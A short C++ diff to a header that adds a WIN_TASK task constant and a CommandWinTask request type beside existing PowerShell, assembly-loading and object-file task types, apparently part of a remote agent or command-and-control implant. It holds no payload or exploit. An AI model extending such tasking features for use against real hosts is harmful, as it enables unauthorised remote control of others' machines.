@@ -32,6 +32,7 @@
 #define NET_ASM				10
 #define OBJECT_FILE			11
 #define GET_UID				12
+#define WIN_TASK			13
 
 //  Statuses 
 #define NO_FLAG 			0
@@ -166,7 +167,7 @@ struct TaskError
 	}
 };
 
-using Request = std::variant<TaskRequest<CommandPowershell>, TaskRequest<bool>>;
+using Request = std::variant<TaskRequest<CommandPowershell>, TaskRequest<CommandWinTask>, TaskRequest<bool>>;
 using Response = std::variant<TaskResponse<TaskSuccess>, TaskResponse<TaskError>>;
 
 inline std::string CreateResponseTaskValue(const std::deque<Response>& tasks) {
